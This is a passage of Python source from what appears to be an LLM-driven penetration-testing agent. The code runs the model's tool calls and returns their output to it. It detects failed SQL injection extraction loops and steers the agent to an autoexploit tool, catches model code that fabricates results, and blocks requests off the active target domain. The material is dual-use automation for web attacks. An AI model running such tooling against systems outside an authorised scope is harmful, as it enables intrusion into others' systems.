                        f"TOOL_RESULT:{{'name':'{_tool_name}','error':'pentest_tools not available','success':false}}"
                    )
                    continue

                # ── v6.2.74: 도구 실행 해커 스타일 헤더 ───────────────
                _args_preview = str(_tool_args)[:100]
                self.console.print(
                    f"\n[{THEME['dim']}]┌─[/][{THEME['accent']}]⚙ {_tool_name}[/]"
                    f"[{THEME['dim']}] ({_tc_i + 1}/{_total_tc}) ────────────────────[/]"
                )
                self.console.print(
                    f"[{THEME['dim']}]│  {_args_preview}[/]"
                )
                _flush_ui()

                _t0 = __import__("time").time()
                # 실행 중 heartbeat — 화면이 不动처럼 보이는 핵심 원인 제거
                _box: dict = {}
                _mute_tool_output = _thr_tool.Event()

                def _run_one(_n=_tool_name, _a=_tool_args):
                    _lock = getattr(self, "_tool_execution_lock", None)
                    if _lock is None:
                        _lock = _thr_tool.Lock()
                        self._tool_execution_lock = _lock
                    while not _lock.acquire(timeout=0.25):
                        if self._agent_stop_flag.is_set():
                            _box["r"] = {
                                "success": False,
                                "output": "INTERRUPTED before tool start",
                                "exit_code": -1,
                            }
                            return

                    _owner = _thr_tool.current_thread()
                    _stdout = _sys_flush.stdout
                    _stderr = _sys_flush.stderr
                    _stdout_proxy = _ToolThreadOutput(
                        _stdout, _owner, self._hint_input_active, _mute_tool_output
                    )
                    _stderr_proxy = _ToolThreadOutput(
                        _stderr, _owner, self._hint_input_active, _mute_tool_output
                    )
                    try:
                        _sys_flush.stdout = _stdout_proxy
                        _sys_flush.stderr = _stderr_proxy
                        _box["r"] = execute_tool(_n, _a)
                    except Exception as _ex:
                        _box["r"] = {
                            "success": False,
                            "output": f"execute_tool exception: {_ex}",
                            "exit_code": -1,
                        }
                    finally:
                        if _sys_flush.stdout is _stdout_proxy:
                            _sys_flush.stdout = _stdout
                        if _sys_flush.stderr is _stderr_proxy:
                            _sys_flush.stderr = _stderr
                        _lock.release()

                _th = _thr_tool.Thread(target=_run_one, daemon=True)
                _th._bingo_mute_output = _mute_tool_output
                self._active_tool_thread = _th
                _th.start()
                _wait_s = 0
                while _th.is_alive():
                    _th.join(timeout=1.0)
                    _wait_s += 1
                    if getattr(self, "_hint_input_active", None) and self._hint_input_active.is_set():
                        # hint 입력 중이면 heartbeat/출력 억제
                        continue
                    if self._agent_stop_flag.is_set():
                        self.console.print(
                            f"[{THEME['warn']}]│  ⏸ stop — waiting up to 8s for {_tool_name}…[/]"
                        )
                        _flush_ui()
                        _th.join(timeout=8.0)
                        break
                    if _wait_s % 5 == 0:
                        self.console.print(
                            f"[{THEME['dim']}]│  ⏱ {_tool_name} running… {_wait_s}s "
                            f"(not frozen)[/]"
                        )
                        _flush_ui()

                if self._agent_stop_flag.is_set() and _th.is_alive():
                    # The worker may be inside a blocking library call. Keep it
                    # serialized, but permanently mute its direct output so it
                    # cannot overwrite the hint prompt or resumed AI stream.
                    _mute_tool_output.set()
                    tool_results.append(
                        f"=== TOOL_RESULT: {_tool_name} ===\n"
                        f"exit_code=-1  success=false  elapsed={_wait_s}s\n"
                        f"--- output ---\nINTERRUPTED mid-tool\n=== END TOOL_RESULT ==="
                    )
                    if not (getattr(self, "_hint_input_active", None) and self._hint_input_active.is_set()):
                        self.console.print(
                            f"[{THEME['warn']}]└─ ✘ interrupted[/]"
                        )
                        _flush_ui()
                    break

                _result = _box.get(
                    "r",
                    {"success": False, "output": "no result", "exit_code": -1},
                )
                _elapsed = round(__import__("time").time() - _t0, 2)
                _tools_executed += 1
                self._active_tool_thread = None

                _out = _result.get("output", "")
                _ok  = _result.get("success", False)
                _ec  = _result.get("exit_code", -1)
                _completed = bool(_result.get("completed", False)) and _ec == 0

                # 화면에 결과 미리보기 출력 (v5.2.7: 스마트 필터 적용)
                if _ok and _ec == 0:
                    _color, _status_icon = THEME["success"], "✔"
                elif _completed:
                    _color, _status_icon = THEME["dim"], "∅"
                else:
                    _color, _status_icon = THEME["warn"], "✘"
                if not (getattr(self, "_hint_input_active", None) and self._hint_input_active.is_set()):
                    self.console.print(
                        f"[{THEME['dim']}]└─[/][{_color}]{_status_icon} exit={_ec}[/]"
                        f"[{THEME['dim']}]  elapsed={_elapsed}s[/]"
                    )
                    _flush_ui()
                if _out:
                    import re as _re_tr
                    from rich.markup import escape as _esc
                    # ── TOOL_RESULT 스마트 필터 ──
                    # AI에게 보내는 _result_str은 필터 없이 전체 보존
                    # 터미널 미리보기만 핵심 줄로 제한
                    _IMP_TR = _re_tr.compile(
                        r'(?:'
                        r'HTTP/\d'
                        r'|status[=:\s]+\d{3}'
                        r'|\b(?:200|201|204|301|302|307|400|401|403|404|429|500|502)\b'
                        r'|content-length\s*:\s*\d'
                        r'|location\s*:\s*https?'
                        r'|set-cookie\s*:'
                        r'|server\s*:\s*\S'
                        r'|x-powered-by|waf|cloudflare'
                        r'|detected|found|error|exception'
                        r'|---http_status|---size'
                        r'|\[\+\]|\[-\]|\[!\]'
                        r'|✅|❌|⚠|🔍|💥'
                        r')',
                        _re_tr.IGNORECASE,
                    )
                    _HTML_TR = _re_tr.compile(r'<[a-zA-Z/!]')
                    _HDR_TR  = _re_tr.compile(r'^[A-Za-z][A-Za-z0-9\-]+\s*:\s*\S')
                    _disp_lines: list[str] = []
                    _html_run = 0
                    _hdr_run  = 0
                    _suppressed_html = 0
                    _suppressed_hdr  = 0
                    _suppressed_body = 0
                    _out_lower_preview = _out[:4096].lower()
                    _html_doc_like = bool(
                        "<html" in _out_lower_preview
                        or "<!doctype" in _out_lower_preview
                        or "<script" in _out_lower_preview
                    )
                    _max_preview_lines = 36 if _html_doc_like else 80
                    for _ln in _out.splitlines()[:160]:  # 검사량은 넉넉히, 표시량은 아래에서 제한
                        _s = _ln.strip()
                        if not _s:
                            continue
                        if len(_disp_lines) >= _max_preview_lines:
                            _suppressed_body += 1
                            continue
                        # 항상 표시: 중요 패턴
                        if _IMP_TR.search(_s):
                            if _suppressed_html:
                                _disp_lines.append(f"  ⋯ {_suppressed_html} HTML lines hidden")
                                _suppressed_html = 0
                            if _suppressed_hdr:
                                _disp_lines.append(f"  ⋯ {_suppressed_hdr} header lines hidden")
                                _suppressed_hdr = 0
                            _html_run = _hdr_run = 0
                            _disp_lines.append(_ln[:200])
                            continue
                        # HTTP 헤더 블록
                        if _HDR_TR.match(_s):
                            _hdr_run += 1
                            _html_run = 0
                            if _hdr_run <= 6:
                                _disp_lines.append(_ln[:200])
                            else:
                                _suppressed_hdr += 1
                            continue
                        else:
                            if _suppressed_hdr:
                                _disp_lines.append(f"  ⋯ {_suppressed_hdr} header lines hidden")
                                _suppressed_hdr = 0
                            _hdr_run = 0
                        # HTML 태그 밀집 줄
                        if len(_HTML_TR.findall(_s)) >= 2 or (_s.startswith("<") and _s.endswith(">")):
                            _html_run += 1
                            _hdr_run = 0
                            if _html_run <= 3:
                                _disp_lines.append(_ln[:200])
                            else:
                                _suppressed_html += 1
                            continue
                        else:
                            if _suppressed_html:
                                _disp_lines.append(f"  ⋯ {_suppressed_html} HTML lines hidden")
                                _suppressed_html = 0
                            _html_run = 0
                        # 일반 줄 (200자 제한)
                        if _html_doc_like and len(_disp_lines) >= 18:
                            _suppressed_body += 1
                            continue
                        _disp_lines.append(_ln[:200])
                    if _suppressed_html:
                        _disp_lines.append(f"  ⋯ {_suppressed_html} HTML lines hidden")
                    if _suppressed_hdr:
                        _disp_lines.append(f"  ⋯ {_suppressed_hdr} header lines hidden")
                    if _suppressed_body:
                        _disp_lines.append(f"  ⋯ {_suppressed_body} body lines hidden (full output kept for AI)")
                    _preview = "\n".join(_disp_lines)
                    try:
                        self.console.print(f"[{THEME['dim']}]{_esc(_preview)}[/]")
                    except Exception:
                        self.console.print(_preview[:1200])

                # 결과를 LLM에게 돌려줄 텍스트로 포맷
                _result_extra = {
                    k: v for k, v in _result.items()
                    if k not in ("output",) and not isinstance(v, (bytes,))
                }
                _result_str = (
                    f"=== TOOL_RESULT: {_tool_name} ===\n"
                    f"exit_code={_ec}  success={_ok}  elapsed={_elapsed}s\n"
                    f"extra={__import__('json').dumps(_result_extra, ensure_ascii=False, default=str)[:500]}\n"
                    f"--- output ---\n{_out}\n"
                    f"=== END TOOL_RESULT ==="
                )

                # ── v6.2.43: aaaa/OOOO 패턴 감지 — 커스텀 SQLi 추출 실패 안전망 ──────────
                # run_python 출력에서 8자 이상 동일 문자 반복 감지
                # → 커스텀 Boolean Oracle 루프가 오작동 중임을 의미
                # → 모델 무관하게 강제 경고 주입 → sqli_autoexploit 전환 강제
                if _tool_name == "run_python" and _out:
                    import re as _re_aaaa
                    _REPEAT_PAT = _re_aaaa.compile(r'([a-zA-Z?])\1{7,}')
                    _repeat_found = _REPEAT_PAT.search(_out)
                    if _repeat_found:
                        _rep_char = _repeat_found.group(1)
                        _warn_repeat = self.s.get("sqli_repeat_char_warning").format(char=_rep_char)
                        self.console.print(f"[{THEME['error']}]{_warn_repeat}[/]")
                        _result_str += (
                            f"\n\n{_warn_repeat}"
                        )
                # ── 감지 끝 ────────────────────────────────────────────────────────────────

                tool_results.append(_result_str)

            if _deferred_names:
                _n_def = len(_deferred_names)
                _cap_msg = (
                    f"[TOOL_CALL_CAP] Deferred {_n_def} call(s) "
                    f"(max {_MAX_TOOLS_PER_TURN} tools / {_MAX_HTTP_GET_PER_TURN} http_get per turn). "
                    f"Use ONE run_bash probe loop instead of flooding http_get."
                )
                self.console.print(f"[{THEME['warn']}]⚠ {_cap_msg}[/]")
                _flush_ui()
                tool_results.append(_cap_msg)

            if tool_results:
                self._last_execution_context = {
                    "executed": _tools_executed > 0,
                    "source": "tool_call",
                    "scripts": [
                        {"type": "tool_call", "code": raw[:16_384], "returncode": 0}
                        for raw in _tool_matches[:10]
                    ],
                    "response_bytes": sum(len(item) for item in tool_results),
                }
                return tool_results
        # ══════════════════════════════════════════════════════════════════════
        # TOOL_CALL 없음 → 기존 bash 블록 처리로 진행 (하위 호환)
        # ══════════════════════════════════════════════════════════════════════

        if "```" not in response:
            return []

        # ── agent_tools 자동 설치 (최초 1회) ─────────────────────────
        _tools_dst = Path.home() / ".bingo" / "agent_tools.py"
        if not _tools_dst.exists():
            try:
                import shutil as _sh
                _tools_src = Path(__file__).parent.parent / "tools" / "agent_tools.py"
                if _tools_src.exists():
                    _tools_dst.parent.mkdir(parents=True, exist_ok=True)
                    _sh.copy2(str(_tools_src), str(_tools_dst))
            except Exception:
                pass

        tmp_dir = Path(tempfile.gettempdir()) / "bingo_agent"
        tmp_dir.mkdir(exist_ok=True)

        # ── 실행할 작업 목록 수집 ─────────────────────────────────────
        tasks: list[dict] = []

        # ── 환각 감지 헬퍼 ──────────────────────────────────────────────
        def _detect_hallucination(raw_code: str, _block_type: str = "python") -> str | None:
            """JSON-in-code-block 또는 실행 불가 가짜 코드 감지.
            _block_type: "python" 또는 "bash"
            문제가 없으면 None, 있으면 경고 메시지 반환."""
            import re as _hall_re
            s = raw_code.strip()

            # ── bash 블록 — 실행 자유도는 유지하되 현재 타겟 정체성은 보존 ────────
            # 도메인 바인딩 웹앱에서 IP URL로 갈아타는 drift만 실행 전 차단한다.
            if _block_type == "bash":
                try:
                    from ..tools_ext.pentest_tools import _check_script_target_drift as _bash_target_check
                    _bash_drift = _bash_target_check(s, "bash")
                    if _bash_drift:
                        return _bash_drift
                except Exception:
                    pass
                return None

            # ── Python 블록 환각 감지 (기존 로직 유지) ────────────────────────

            # 패턴 1: 순수 JSON dict (import/def/print/requests 없음)
            if s.startswith("{") and s.endswith("}"):
                has_code = any(kw in s for kw in
                    ["import ", "def ", "class ", "requests.", "urllib", "print(", "httpx"])
                if not has_code:
                    return (
                        "JSON_DICT_NOT_CODE: Your code block contains only a JSON "
                        "dictionary, not Python. JSON cannot make HTTP requests. "
                        "Rewrite as bash: curl -s \"https://TARGET/\" | python3 -c \"import sys; print(sys.stdin.buffer.read()[:500])\""
                    )

            # 패턴 2: (v6.0.0 제거) STUB_CODE_NO_HTTP — Claude CLI 모드에서는 허용
            _lines = [l for l in s.splitlines() if l.strip() and not l.strip().startswith("#")]
            _has_network = any(kw in s for kw in
                ["requests.", "urllib.", "httpx.", "socket.connect", "http.client",
                 "urlopen", "urlretrieve", "pymssql", "pyodbc"])

            # 패턴 3: print("...") 만 있고 실제 네트워크/로직 없음
            _non_print = [l for l in _lines if not l.strip().startswith("print(")]
            _all_imports = [l for l in _non_print if l.strip().startswith("import ") or l.strip().startswith("from ")]
            if len(_non_print) == len(_all_imports) and len(_lines) > 0 and not _has_network:
                return (
                    "PRINT_ONLY_CODE: Code only has print() statements and imports — "
                    "no actual HTTP request or logic. Use a bash block with curl commands."
                )

            # 패턴 4: 도메인/URL 하드코딩 없이 variable placeholder만 있는 코드
            # (url = "TARGET_URL" 같은 미완성 코드)
            if _hall_re.search(r'["\'](?:TARGET_URL|YOUR_URL|PLACEHOLDER|INSERT_URL)["\']', s, _hall_re.IGNORECASE):
                return (
                    "PLACEHOLDER_URL: Code contains placeholder URL (TARGET_URL/YOUR_URL). "
                    "Replace with the actual target URL before executing."
                )
            _placeholder_names = (
                "URL", "PARAM", "BASE_VALUE", "TRUESIZE", "TRUE_SIZE",
                "FALSESIZE", "FALSE_SIZE", "THRESHOLD", "VAL",
            )
            _unbound_placeholders = [
                name for name in _placeholder_names
                if _hall_re.search(rf'\b{name}\b', s)
                and not _hall_re.search(rf'(?m)^\s*{name}\s*=', s)
                and not _hall_re.search(rf'\bfor\s+{name}\s+in\b', s)
            ]
            _placeholder_assignment = _hall_re.search(
                r'(?m)^\s*(?:URL|PARAM|BASE_VALUE|TRUESIZE|TRUE_SIZE|FALSESIZE|'
                r'FALSE_SIZE|THRESHOLD|VAL)\s*=\s*["\'](?:<[^>]+>|'
                r'URL|PARAM|BASE_VALUE|TRUESIZE|THRESHOLD|REPLACE_ME|CHANGE_ME|'
                r'YOUR_[A-Z_]+|TARGET_[A-Z_]+)["\']',
                s,
                _hall_re.IGNORECASE,
            )
            if _unbound_placeholders or _placeholder_assignment:
                return (
                    "PLACEHOLDER_TEMPLATE_CODE: Python block contains unresolved "
                    f"template placeholder(s): {', '.join(_unbound_placeholders) or 'assignment'}. "
                    "Do not execute generic examples; regenerate a concrete TOOL_CALL run_python "
                    "or Bash command with the active target values."
                )

            # ── v3.2.73 패턴 5: 코드 내부 모의실행 감지 ──────────────────
            # 5-A: 模拟/simulate/假设 키워드가 변수 할당과 함께 나타나는 경우
            # 예: simulated_response = {...}, 模拟结果 = {...}
            _SIM_VAR_RE = _hall_re.compile(
                r"(?:"
                r"simulated?_(?:response|result|output|data|return)"
                r"|mock(?:ed)?_(?:response|result|output|data)"
                r"|fake_(?:response|result|output|data)"
                r"|假(?:设|的)?(?:响应|结果|数据|返回)"
                r"|模拟(?:响应|结果|数据|返回|执行)"
                r"|假设结果|虚拟响应|仿真结果"
                r"|가(?:상|짜)[\s_]?(?:결과|응답|데이터)"
                r"|모의[\s_]?(?:결과|응답|실행)"
                r")\s*=",
                _hall_re.IGNORECASE,
            )
            if _SIM_VAR_RE.search(s):
                return (
                    "SIMULATED_VAR: Code assigns a simulated/mock/fake response variable "
                    "(simulated_response / 模拟结果 / 가상결과). "
                    "This means NO real HTTP request was made. "
                    "DELETE the hardcoded data and use a bash block: curl -sk -m 30 \"URL\" | python3 -c 'import sys; print(sys.stdin.read()[:500])'"
                )

            # 5-B: # 模拟 / # simulate 주석 직후 결과 dict 할당
            _SIM_COMMENT_THEN_DICT = _hall_re.compile(
                r"#\s*(?:模拟|模拟执行|simulate|simulated?|假设|가상|모의)[^\n]*\n"
                r"\s*\w+\s*=\s*[\[{\"']",
                _hall_re.IGNORECASE,
            )
            if _SIM_COMMENT_THEN_DICT.search(s):
                return (
                    "SIMULATED_COMMENT+ASSIGN: Code has a '# simulate/模拟' comment "
                    "followed immediately by a hardcoded assignment. "
                    "Real HTTP calls MUST be used. Remove the simulation block."
                )

            # 5-C: requests.get/post 없이 "假设服务器返回" / "assume server returns" 사용
            _ASSUME_SERVER_RE = _hall_re.compile(
                r"(?:假设服务器返回|假设HTTP响应|assume\s+server\s+return"
                r"|assuming\s+server\s+respond|서버가\s+반환한다고\s+가정)",
                _hall_re.IGNORECASE,
            )
            if _ASSUME_SERVER_RE.search(s) and not _has_network:
                return (
                    "ASSUME_SERVER: Code says 'assume server returns ...' without making "
                    "a real HTTP request. Replace assumption with actual curl command."
                )

            # 5-D: 네트워크 호출은 있으나 결과를 바로 하드코딩으로 덮어쓰는 패턴
            # requests.get(...) 가 있지만 바로 아래 result = {...} 하드코딩 할당
            if _has_network:
                _OVERRIDE_DICT = _hall_re.compile(
                    r"requests\.(?:get|post|put|delete|patch)\s*\([^)]+\)\s*\n"
                    r"(?:[^\n]*\n){0,3}"  # 0~3줄 사이
                    r"\s*\w*result\w*\s*=\s*[\[{\"']\s*(?:\"|'|{)",
                    _hall_re.IGNORECASE,
                )
                if _OVERRIDE_DICT.search(s):
                    return (
                        "OVERRIDDEN_RESULT: Code calls HTTP but immediately "
                        "overwrites result with a hardcoded dict/string. "
                        "Use the ACTUAL response: curl -sk -m 30 \"URL\" | python3 -c 'import sys; print(sys.stdin.read())'"
                    )

            # ── v4.9.0 패턴 6: 텍스트 서술에서 미실행 결과 위조 감지 (확장) ──────
            # 기록.md L1192: "EXTRACTVALUE 返回了 ~z~5.4~z~" 식의 환각
            # v4.9.0: Gap 4 수정 — 표현 변형 추가로 탐지 커버리지 향상
            _CLAIMED_RESULT_RE = _hall_re.compile(
                r"(?:"
                # ── 중국어 결과 서술 패턴 ──────────────────────────────────────
                r"(?:返回了|返回结果|返回的结果|查询结果为|执行结果)\s*[：:]\s*.{3,80}"
                r"|(?:结果[是为]|得到的结果|获取到了|我们得到了|拿到了)\s*.{3,80}"
                r"|(?:数据库名?|表名|用户名|版本号?)[：:\s为是显=].{2,60}"
                r"|(?:显示(?:为|了|出)|表明|说明|发现)\s*.{3,60}(?:数据库|版本|用户|表名|DB)"
                r"|(?:DB|数据库|版本)\s*(?:为|是|=|:)\s*['\"]?.{2,60}"
                # ── 영어 결과 서술 패턴 ──────────────────────────────────────
                r"|(?:returned?|got back|response was|result[:\s]+)['\"]?.{3,80}"
                r"|(?:confirmed|verified|extracted)\s+(?:that\s+)?(?:the\s+)?(?:db|database|table|user)[:\s].{3,60}"
                r"|(?:the\s+)?(?:db|database|version|username|table)\s+(?:is|was|=)\s*['\"]?.{2,60}"
                r"|(?:shows?|reveals?|indicates?)\s+(?:that\s+)?(?:the\s+)?(?:db|version|user|table).{3,60}"
                r"|(?:we\s+(?:found|got|confirmed|extracted|have))\s+(?:the\s+)?(?:db|version|user|table).{3,60}"
                # ── 한국어 결과 서술 패턴 ──────────────────────────────────────
                r"|(?:반환됨|결과는|추출됨|확인됨|가져옴|발견됨)[：:\s].{2,60}"
                r"|(?:DB명?|버전|사용자명?|테이블명?)\s*(?:은|는|이|가|=|:)\s*.{2,50}(?:임|였|이다|입니다|으로\s*확인)"
                r"|(?:나왔|검출됨|추출\s*성공|확인\s*완료)[：:\s].{2,60}"
                r")",
                _hall_re.IGNORECASE,
            )
            # 위 패턴이 주석(#)이나 print()가 아닌 코드 영역에서 문자열 리터럴로 등장하면 환각
            for _m in _CLAIMED_RESULT_RE.finditer(s):
                _start = _m.start()
                # 해당 위치가 주석 행인지 확인
                _line_start = s.rfind('\n', 0, _start) + 1
                _line_text = s[_line_start:_start].lstrip()
                # 주석이 아니고, print()도 아니고, 실제 네트워크 호출이 없으면 → 환각
                if (not _line_text.startswith('#')
                        and 'print(' not in s[max(0,_start-40):_start]
                        and not _has_network):
                    return (
                        "CLAIMED_RESULT_WITHOUT_EXEC: Code describes result "
                        f"({_m.group(0)[:80]!r}) as text/comment without running real HTTP "
                        "request. ALL results MUST come from actual curl execution output. "
                        "Use: curl -sk -m 10 \"${TARGET}/path\" | python3 -c \"import sys; print(sys.stdin.read()[:500])\". "
                        "Remove the fabricated result."
                    )

            # ── v4.9.3 패턴 7: AST 기반 타겟 URL 검사 (완전 재작성) ─────────────────
            # 이전 방식(regex): 주석·헤더 딕셔너리 내 URL을 오탐 → User-Agent의
            #   http://www.google.com/bot.html 를 실제 요청 타겟으로 잘못 판단
            # 새 방식(AST): Python 코드 파서로 구문 트리를 직접 분석
            #   - AST는 주석을 완전히 무시 (파서 단계에서 제거됨)
            #   - 딕셔너리 값 vs 함수 호출 인수를 구조적으로 구분
            #   - requests.get(URL), session.post(url=URL) 의 실제 인수만 추출
            #   - headers={'User-Agent':'...'} 내 값은 절대 추출하지 않음
            import ast as _p7ast
            import urllib.parse as _up

            def _p7_ast_extract_request_urls(code_str: str) -> list:
                """AST 구문 트리에서 실제 HTTP 요청 타겟 URL만 추출.
                - 주석, 헤더 딕셔너리, 문자열 변수 내 URL 완전 제외
                - 요청 메서드 첫 인수(위치) 또는 url= 키워드 인수만 수집
                - url/target/base_url 변수 할당도 수집
                """
                _HTTP_METHODS = {
                    'get', 'post', 'put', 'patch', 'delete',
                    'head', 'options', 'request', 'urlopen',
                }
                _URL_VAR_NAMES = {
                    'url', 'target', 'endpoint', 'base_url',
                    'base', 'host', 'uri', 'target_url',
                }
                _found: list = []

                # SyntaxError 발생 시(f-string 등 Python 버전 차이) 빈 리스트 반환
                try:
                    _tree = _p7ast.parse(code_str)
                except SyntaxError:
                    return _found

                def _str_val(node) -> str | None:
                    """AST 노드에서 문자열 상수 값 추출."""
                    if isinstance(node, _p7ast.Constant) and isinstance(node.value, str):
                        return node.value
                    # f-string (JoinedStr): 첫 번째 Constant 조각에 도메인 포함
                    if isinstance(node, _p7ast.JoinedStr) and node.values:
                        _fst = node.values[0]
                        if isinstance(_fst, _p7ast.Constant) and isinstance(_fst.value, str):
                            return _fst.value
                    return None

                for _node in _p7ast.walk(_tree):
                    # ── 함수/메서드 호출: requests.get(URL), session.post(url=URL) ──
                    if isinstance(_node, _p7ast.Call):
                        if isinstance(_node.func, _p7ast.Attribute):
                            if _node.func.attr.lower() in _HTTP_METHODS:
                                # 첫 번째 위치 인수
                                if _node.args:
                                    _v = _str_val(_node.args[0])
                                    if _v and _v.startswith('http'):
                                        _found.append(_v)
                                # url= 키워드 인수
                                for _kw in _node.keywords:
                                    if _kw.arg == 'url':
                                        _v = _str_val(_kw.value)
                                        if _v and _v.startswith('http'):
                                            _found.append(_v)
                    # ── 변수 할당: url = "https://...", target = "https://..." ──
                    elif isinstance(_node, _p7ast.Assign):
                        for _tgt in _node.targets:
                            if isinstance(_tgt, _p7ast.Name) and _tgt.id.lower() in _URL_VAR_NAMES:
                                _v = _str_val(_node.value)
                                if _v and _v.startswith('http'):
                                    _found.append(_v)
                    # ── 어노테이션 할당: url: str = "https://..." ──
                    elif isinstance(_node, _p7ast.AnnAssign):
                        if (isinstance(_node.target, _p7ast.Name)
                                and _node.target.id.lower() in _URL_VAR_NAMES
                                and _node.value is not None):
                            _v = _str_val(_node.value)
                            if _v and _v.startswith('http'):
                                _found.append(_v)

                return _found

            _active_target = (
                getattr(self, "_agent_state", {}).get("target")
                or getattr(self, "_current_target", None)
            )
            if _active_target and _has_network:
                _t_str = _active_target if "://" in _active_target else f"https://{_active_target}"
                _t_parsed = _up.urlparse(_t_str)
                _t_domain = (_t_parsed.hostname or _t_parsed.netloc).lower().removeprefix("www.")

                # AST로 실제 요청 타겟 URL만 추출
                _p7_urls = _p7_ast_extract_request_urls(s)

                import re as _p7re

                def _p7_is_ip_literal(host: str) -> bool:
                    try:
                        import ipaddress as _p7ip
                        _p7ip.ip_address(host)
                        return True
                    except Exception:
                        return False

                def _p7_has_current_host_header(code_str: str) -> bool:
                    _host_header_re = _p7re.compile(
                        r"""(?ix)
                        (?:
                            \bHost\b\s*['"]?\s*[:=]\s*['"]?\s*
                          | ['"]Host['"]\s*:\s*['"]\s*
                        )
                        ([a-z0-9._-]+)
                        """
                    )
                    for _hm in _host_header_re.finditer(code_str):
                        if _hm.group(1).lower().removeprefix("www.") == _t_domain:
                            return True
                    return False

                _p7_current_host_header = _p7_has_current_host_header(s)
                for _cu in _p7_urls:
                    # f-string placeholder({...}) 제거 후 도메인 비교
                    _cu_clean = _p7re.sub(r'\{[^}]+\}', '', _cu)
                    _cu_parsed = _up.urlparse(_cu_clean)
                    _cu_domain = (_cu_parsed.hostname or _cu_parsed.netloc).lower().removeprefix("www.")
                    if not _cu_domain:
                        continue
                    if _cu_domain != _t_domain:
                        if _p7_is_ip_literal(_cu_domain):
                            if _p7_current_host_header:
                                continue
                            return (
                                f"DOMAIN_BOUND_IP_BLOCKED: Code sends HTTP request to direct IP '{_cu_domain}' "
                                f"while the ACTIVE TARGET is '{_active_target}' (domain: '{_t_domain}'). "
                                "Do not switch a domain-bound web target to an IP URL; the IP may serve a different vhost/site. "
                                f"Keep the URL on '{_t_domain}', or use curl --resolve / an explicit Host header only for transport pinning."
                            )
                        return (
                            f"TARGET_DOMAIN_MISMATCH: Code sends HTTP request to '{_cu}' "
                            f"(domain: '{_cu_domain}'), but the ACTIVE TARGET is "
                            f"'{_active_target}' (domain: '{_t_domain}'). "
                            f"You MUST only test the current target domain. "
                            f"Replace '{_cu_domain}' with '{_t_domain}' in your code. "
                            f"To switch targets, the user must explicitly provide a new target."
                        )

            return None

        # ── 코드 사전 검증 헬퍼 (SyntaxError / NameError 예방) ──────────
        def _precheck_python_code(code: str) -> "tuple[str | None, list[str]]":
            """실행 전 Python 코드의 명백한 구문 오류 + 무한루프 패턴 감지 + 타임아웃 자동 주입.
            반환: (결과코드 or None or '__BLOCKED__:...' or '__SYNTAX_ERR__', 적용된 수정 이름 리스트)
            문제 없으면 None, 수정/주입 시 수정된 코드, 차단 시 '__BLOCKED__:reason' 반환."""
            import re as _pre_re

            fixed = code
            # fix 추적 리스트를 함수 최상단에서 초기화 (0-A 블록에서 먼저 사용되므로)
            _applied_fix_names: list[str] = []

            # ── v4.7.0 AST 정적 분석 — 무한루프 선제 차단 (최우선, Regex보다 정확) ────
            # code_guard.check() → None(안전) | "INFINITE_LOOP_RISK: ..." (위험)
            # Regex 0-A/0-B 보다 앞서 실행: false positive/negative 최소화.
            try:
                from ..core.code_guard import check as _cg_check
                _cg_reason = _cg_check(code)
                if _cg_reason:
                    return (f"__BLOCKED__:{_cg_reason}", [])
            except ImportError:
                pass  # code_guard 로드 실패 시 기존 Regex 방식으로 폴백
            except Exception:
                pass  # AST 분석 오류 → 안전하게 통과 (실행 차단 안 함)

            # ── 0-Y. urllib.parse 미import 자동 주입 ──────────────────────────
            # AI가 urllib3만 import하고 urllib.parse.quote/urlencode/urlparse 등 사용 → NameError
            _urllib_parse_uses = bool(_pre_re.search(
                r'\burllib\.parse\.(quote|urlencode|urlparse|urlunparse|urljoin|parse_qs|parse_qsl)\b',
                fixed
            ))
            _urllib_parse_imported = bool(_pre_re.search(
                r'^(?:import urllib\.parse|from urllib(?:\.parse)?\s+import)',
                fixed, _pre_re.MULTILINE
            ))
            if _urllib_parse_uses and not _urllib_parse_imported:
                # 첫 번째 import 줄 앞에 삽입
                _first_import_match = _pre_re.search(r'^(?:import |from )', fixed, _pre_re.MULTILINE)
                if _first_import_match:
                    _fip = _first_import_match.start()
                    fixed = fixed[:_fip] + "import urllib.parse\n" + fixed[_fip:]
                else:
                    fixed = "import urllib.parse\n" + fixed
                fixed = "__URLLIB_INJECTED__\n" + fixed

            # ── 0-YY. base64 미import 자동 감지·주입 (v3.2.26, RULE 26-Y) ──────
            # AI가 b64decode/b64encode/b64 alias를 import 없이 사용 → NameError 방지
            _b64_uses = bool(_pre_re.search(
                r'\b(b64decode|b64encode|b32decode|b32encode|b85decode|b85encode|urlsafe_b64decode|urlsafe_b64encode)\b',
                fixed
            ))
            _base64_imported = bool(_pre_re.search(
                r'^(?:import base64|from base64\s+import)',
                fixed, _pre_re.MULTILINE
            ))
            if _b64_uses and not _base64_imported:
                _first_import_match2 = _pre_re.search(r'^(?:import |from )', fixed, _pre_re.MULTILINE)
                if _first_import_match2:
                    _fip2 = _first_import_match2.start()
                    fixed = fixed[:_fip2] + "import base64\n" + fixed[_fip2:]
                else:
                    fixed = "import base64\n" + fixed
                fixed = "__BASE64_INJECTED__\n" + fixed

            # ── 0-Z. 인코딩 자동 감지 헬퍼 주입 ──────────────────────────────
            # r.text / resp.text 사용 시 EUC-KR 등 구형 인코딩 깨짐 방지
            # requests.get/post 가 있고 smart_decode 가 없는 경우 헬퍼 + 교체 주입
            # v3.2.20: AI가 _smart_decode() 직접 호출했으나 def가 없는 경우도 주입
            _has_requests = bool(_pre_re.search(r'\brequests\.(get|post|put|patch|delete)\b', fixed))
            _has_smart_decode_def = "def _smart_decode" in fixed
            _has_smart_decode_call = bool(_pre_re.search(r'\b_smart_decode\s*\(', fixed))
            _has_rtext = bool(_pre_re.search(r'\b(?:r|resp|response|res)\s*\.\s*text\b', fixed))
            # 주입 조건: (requests+r.text 있고 def 없음) OR (_smart_decode() 호출 있고 def 없음)
            _need_smart_inject = (
                (_has_requests and _has_rtext and not _has_smart_decode_def)
                or (_has_smart_decode_call and not _has_smart_decode_def)
            )
            if _need_smart_inject:
                _smart_decode_helper = (
                    "\ndef _smart_decode(resp):\n"
                    "    import re as _sre\n"
                    "    raw = resp.content\n"
                    "    ct = resp.headers.get('Content-Type', '')\n"
                    "    m = _sre.search(r'charset\\s*=\\s*([^\\s;,\"]+)', ct, _sre.I)\n"
                    "    enc = m.group(1).strip() if m else None\n"
                    "    if not enc:\n"
                    "        mm = _sre.search(rb'charset\\s*=\\s*[\"\\']?([a-zA-Z0-9_\\-]+)', raw[:4096], _sre.I)\n"
                    "        enc = mm.group(1).decode('ascii', errors='ignore').strip() if mm else None\n"
                    "    for cand in [enc, getattr(resp, 'apparent_encoding', None), 'utf-8']:\n"
                    "        if not cand: continue\n"
